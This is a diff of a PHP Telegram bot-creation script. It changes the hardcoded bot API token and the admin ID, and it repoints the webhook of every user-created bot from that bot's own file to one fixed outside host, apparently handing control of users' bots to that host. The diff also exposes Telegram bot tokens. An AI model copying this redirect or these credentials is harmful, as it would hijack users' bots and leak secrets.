@@ -7,7 +7,7 @@
 # if you need Help for develop this source , You Can Send Message To Me With @SpyGuard_BOT #
 ############################################################################################
 */
-define('API_KEY','233635555:AAGSjuXo5YKhdwTqQon7cHDDTGO2dumFhIw');
+define('API_KEY','298223517:AAHrHyZ9OObdW9TMnp-1QSvwn2SH-_rnVuQ');
 //----######------
 function makereq($method,$datas=[]){
     $url = "https://api.telegram.org/bot".API_KEY."/".$method;
@@ -60,7 +60,7 @@ $username = $update->message->from->username;
 $textmessage = isset($update->message->text)?$update->message->text:'';
 $reply = $update->message->reply_to_message->forward_from->id;
 $stickerid = $update->message->reply_to_message->sticker->file_id;
-$admin = 66443035;
+$admin = 193930120;
 $step = file_get_contents("data/".$from_id."/step.txt");
 
 //-------
@@ -191,7 +191,7 @@ $token = $textmessage ;
 		$source = str_replace("[*BOTTOKEN*]",$token,$source);
 		$source = str_replace("66443035",$from_id,$source);
 		save("bots/$un/index.php",$source);	
-		file_get_contents("https://api.telegram.org/bot".$token."/setwebhook?url=https://zirgozaronline.ir/tg/PvSazBot/bots/$un/index.php");
+		file_get_contents("https://api.telegram.org/bot".$token."/setwebhook?url=https://mmdb-mohamad00.rhcloud.com/index.php");
 		SendMessage($chat_id,"🚀 ربات شما با موفقیت نصب شده است 
 
 [برای ورود به ربات خود کلیک کنید 😃](https://telegram.me/$un)");
